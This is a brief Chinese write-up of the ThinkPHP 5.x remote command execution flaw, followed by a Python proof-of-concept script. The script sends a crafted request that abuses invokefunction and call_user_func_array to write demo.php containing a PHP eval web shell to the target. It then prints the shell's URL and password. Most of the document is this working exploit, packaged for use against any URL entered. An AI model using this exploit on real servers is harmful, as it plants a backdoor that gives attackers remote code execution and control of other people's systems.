# ThinkPHP5命令执行漏洞

> 适用ThinkPHP5.0 and 5.1,此poc在php5.1.15测试生效.

~~~markdown
在Controller中由于未过滤输入参数,可以用\符号调用其他的类,又因为Controller通过parseModuleAndClass方法对$moudle和$class方法进行解析,$name中以\开始
时将后边的作为类名,因此,通过控制$name的输入,可以调用其他类.
~~~

Poc

~~~python
#! usr/bin/pyton
# -*- coding:utf-8 -*-
#author: i4mhmh
# ThinkPHP 5.x < 5.1.31, <= 5.0.23 
import requests

def cent_poc(url):
    target_url = url + '?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1]
    []=demo.php&vars[1][]=<?php @eval($_POST["demo"]);?>'
    res = requests.get(target_url)
    return res.status_code

def main():		
    url = str(input('input your target url(index): '))
    if cent_poc(url) == 200: #尝试运行poc检测
        print('[+] Attack! file_upload Success, url='+ url + 'demo.php' +', password=demo')
    else:
        print('[-] Poc Not Come Into Force')
main()
~~~

